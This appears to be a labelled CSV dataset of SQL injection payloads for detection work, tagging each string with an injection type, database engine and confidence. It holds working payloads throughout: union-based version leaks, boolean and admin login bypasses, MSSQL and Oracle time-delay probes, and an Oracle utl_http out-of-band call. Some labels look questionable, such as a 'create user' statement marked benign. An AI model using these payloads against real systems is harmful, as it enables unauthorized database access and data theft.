id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
279,; if is_srvrolemember ( 'sysadmin' ) > 0 waitfor delay '0:0:2' --,time_blind,mssql,1.0,"Signals: 'waitfor', 'if'; Time-blind SQLi (sleep/delay function); DB: mssql",2
335,"1' ) where 6941 = 6941 and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) --",time_blind,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; Time-blind SQLi (sleep/delay function); DB: oracle",2
395,"1' or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) and 'xmnd' = 'xmnd",time_blind,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; Time-blind SQLi (sleep/delay function); DB: oracle",2
203,||utl_http.request ( 'httP://192.168.1.1/' ) ||',out_of_band,oracle,0.9,Signals: 'utl_http'; DB: oracle. Payload length: 48 chars.,2
309,create user name identified by 'pass123',benign,mysql,0.9,Signals: 'if'; DB: mysql. Payload length: 40 chars.,2
379,"iif ( 7889 = 5114,1,1/0 )",benign,mysql,0.9,Signals: 'if'; DB: mysql. Payload length: 25 chars.,2
200,"select * from users where id = 1 +$ . union select null,@@VERSION -- 1",union_based,generic,0.7,UNION-based payload detected. Payload length: 70 chars.,2
201,"select * from users where id = 1 or 1#""? union select null,version ( ) -- 1",union_based,generic,0.7,UNION-based payload detected. Payload length: 75 chars.,2
206,"select * from users where id = 1 union select +!<1,version ( ) -- 1",union_based,generic,0.7,UNION-based payload detected. Payload length: 67 chars.,2
209,"select * from users where id = 1 union select !<1,version ( ) -- 1",union_based,generic,0.7,UNION-based payload detected. Payload length: 66 chars.,2
210,"select * from users where id = '1' union select \#,@@VERSION -- 1'",union_based,generic,0.7,UNION-based payload detected. Payload length: 66 chars.,2
211,"select * from users where id = 1 or 1#""{ union select 1,version ( ) -- 1",union_based,generic,0.7,UNION-based payload detected. Payload length: 72 chars.,2
215,â or 3 = 3 --,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 15 chars.,2
217,"select * from users where id = 1 +1 union select null,banner from v$version where rownum = 1 -- 1",union_based,oracle,0.7,UNION-based payload detected; DB: oracle. Payload length: 97 chars.,2
218,"select * from users where id = 1 + $+%1 union select null,@@VERSION -- 1",union_based,generic,0.7,UNION-based payload detected. Payload length: 72 chars.,2
219,"select * from users where id = 1 or 1#""? union select version ( ) ,version ( ) -- 1",union_based,generic,0.7,UNION-based payload detected. Payload length: 83 chars.,2
223,"select * from users where id = '1' union select !<1,version ( ) -- 1'",union_based,generic,0.7,UNION-based payload detected. Payload length: 69 chars.,2
224,23 or 1 = 1; --,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 15 chars.,2
225,"select * from users where id = 1 or \<\. union select 1,@@VERSION -- 1",union_based,generic,0.7,UNION-based payload detected. Payload length: 70 chars.,2
229,"select * from users where id = '1' union select \,@@VERSION -- 1'",union_based,generic,0.7,UNION-based payload detected. Payload length: 65 chars.,2
230,0 or 1 = 1,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 10 chars.,2
240,"hi or 1 = 1 --""",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 15 chars.,2
241,"select * from users where id = 1. union select null,banner from v$version where rownum = 1 -- 1",union_based,oracle,0.7,UNION-based payload detected; DB: oracle. Payload length: 95 chars.,2
242,"select * from users where id = '1' or 1^ = 1 union select 1,banner from v$version where rownum = 1 -- 1'",union_based,oracle,0.7,UNION-based payload detected; DB: oracle. Payload length: 104 chars.,2
243,"select * from users where id = '1' union select ""?""_,version ( ) -- 1'",union_based,generic,0.7,UNION-based payload detected. Payload length: 70 chars.,2
245,Ã½ or 1 = 1 --,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 14 chars.,2
247,or 1 = 1 /*,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 11 chars.,2
248,"select * from users where id = '1' union select $ .,@@VERSION -- 1'",union_based,generic,0.7,UNION-based payload detected. Payload length: 67 chars.,2
250,"select * from users where id = 1 union select null,banner from v$version where rownum = 1 -- 1",union_based,oracle,0.7,UNION-based payload detected; DB: oracle. Payload length: 94 chars.,2
252,"select * from users where id = 1 or @<@ = 1 union select 1,version ( ) -- 1",union_based,generic,0.7,UNION-based payload detected. Payload length: 75 chars.,2
254,"select * from users where id = 1 + \+%1 union select null,@@VERSION -- 1",union_based,generic,0.7,UNION-based payload detected. Payload length: 72 chars.,2
257,‘ or 1 = 1 --,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 13 chars.,2
258,"select * from users where id = 1 *\. union select null,@@VERSION -- 1",union_based,generic,0.7,UNION-based payload detected. Payload length: 69 chars.,2
261,"select * from users where id = 1 union select 1<@,version ( ) -- 1",union_based,generic,0.7,UNION-based payload detected. Payload length: 66 chars.,2
262,"select * from users where id = 1 + \+*\ union select null,@@VERSION -- 1",union_based,generic,0.7,UNION-based payload detected. Payload length: 72 chars.,2
264,"select * from users where id = 1 union select @ 1$,version ( ) -- 1",union_based,generic,0.7,UNION-based payload detected. Payload length: 67 chars.,2
265,"select * from users where id = 1 union select @ 1a,version ( ) -- 1",union_based,generic,0.7,UNION-based payload detected. Payload length: 67 chars.,2
266,"select * from users where id = 1 or @$# = 1 union select 1,version ( ) -- 1",union_based,generic,0.7,UNION-based payload detected. Payload length: 75 chars.,2
267,"select * from users where id = '1' or ( \. ) = 1 union select 1,@@VERSION -- 1'",union_based,generic,0.7,UNION-based payload detected. Payload length: 79 chars.,2
268,"select * from users where id = '1' union select 1""!"",banner from v$version where rownum = 1 -- 1'",union_based,oracle,0.7,UNION-based payload detected; DB: oracle. Payload length: 97 chars.,2
274,"select * from users where id = 11<1# union select 1,version ( ) -- 1",union_based,generic,0.7,UNION-based payload detected. Payload length: 68 chars.,2
276,"select * from users where id = '1' or \.<1 union select 1,@@VERSION -- 1'",union_based,generic,0.7,UNION-based payload detected. Payload length: 73 chars.,2
277,"select * from users where id = '1' <@&1 union select 1,version ( ) -- 1'",union_based,generic,0.7,UNION-based payload detected. Payload length: 72 chars.,2
281,"select * from users where id = 1 union select @<@$,version ( ) -- 1",union_based,generic,0.7,UNION-based payload detected. Payload length: 67 chars.,2
282,"select * from users where id = '1' <@<@ union select 1,version ( ) -- 1'",union_based,generic,0.7,UNION-based payload detected. Payload length: 72 chars.,2
284,"select * from users where id = 1 or 1#""{ union select version ( ) ,version ( ) -- 1",union_based,generic,0.7,UNION-based payload detected. Payload length: 83 chars.,2
285,a' or 1 = 1--,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 13 chars.,2
289,"select * from users where id = '1' <@$_ union select 1,version ( ) -- 1'",union_based,generic,0.7,UNION-based payload detected. Payload length: 72 chars.,2
292,"select * from users where id = 1 %$ 1 union select null,@@VERSION -- 1",union_based,generic,0.7,UNION-based payload detected. Payload length: 70 chars.,2
294,admin' or 1 = 1,auth_bypass,generic,0.7,Authentication bypass pattern. Payload length: 15 chars.,2
295,"select * from users where id = 1 union select @||1,version ( ) -- 1",union_based,generic,0.7,UNION-based payload detected. Payload length: 67 chars.,2
296,"select * from users where id = 1 +\+. union select null,@@VERSION -- 1",union_based,generic,0.7,UNION-based payload detected. Payload length: 70 chars.,2
298,"select * from users where id = 1 or 1#""; union select version ( ) ,version ( ) -- 1",union_based,generic,0.7,UNION-based payload detected. Payload length: 83 chars.,2
300,1 or 1 = 1,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 10 chars.,2
301,"select * from users where id = 1 or @`\` union select 1,version ( ) -- 1",union_based,generic,0.7,UNION-based payload detected. Payload length: 72 chars.,2
303,"select * from users where id = 1 -@<@ union select null,version ( ) -- 1",union_based,generic,0.7,UNION-based payload detected. Payload length: 72 chars.,2
304,"select * from users where id = 1 union select 1a#,banner from v$version where rownum = 1 -- 1",union_based,oracle,0.7,UNION-based payload detected; DB: oracle. Payload length: 93 chars.,2
306,or 1 = 1#,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 9 chars.,2
310,"select * from users where id = 1.*\ union select null,@@VERSION -- 1",union_based,generic,0.7,UNION-based payload detected. Payload length: 68 chars.,2
